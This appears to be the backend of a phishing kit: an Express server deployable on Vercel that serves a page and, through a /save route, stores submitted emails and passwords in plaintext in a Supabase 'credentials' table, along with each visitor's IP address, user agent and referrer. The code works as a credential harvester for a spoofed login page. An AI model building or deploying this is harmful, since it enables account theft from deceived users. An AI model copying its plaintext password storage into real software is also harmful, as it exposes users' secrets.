const express = require('express');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Supabase setup
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
let supabase = null;

if (supabaseUrl && supabaseKey) {
  supabase = createClient(supabaseUrl, supabaseKey);
}

// Middleware to parse JSON
app.use(express.json());

// Serve static files with proper MIME types
app.use(express.static(__dirname, {
  setHeaders: (res, path) => {
    if (path.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css');
    }
  }
}));

// Root route
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route to save credentials
app.post('/save', async (req, res) => {
  if (!supabase) {
    return res.status(500).json({ success: false, message: 'Database not configured' });
  }
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const referrer = req.get('Referer');

  try {
    const { data, error } = await supabase
      .from('credentials')
      .insert([
        {
          email,
          password,
          timestamp,
          ip,
          user_agent: userAgent,
          referrer
        }
      ]);

    if (error) {
      console.error('Error saving to database:', error);
      res.status(500).json({ success: false, message: 'Failed to save credentials' });
    } else {
      res.json({ success: true, message: 'Credentials saved successfully' });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, message: 'Failed to save credentials' });
  }
});

// Export for Vercel
module.exports = app;

// For local development
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
  });
}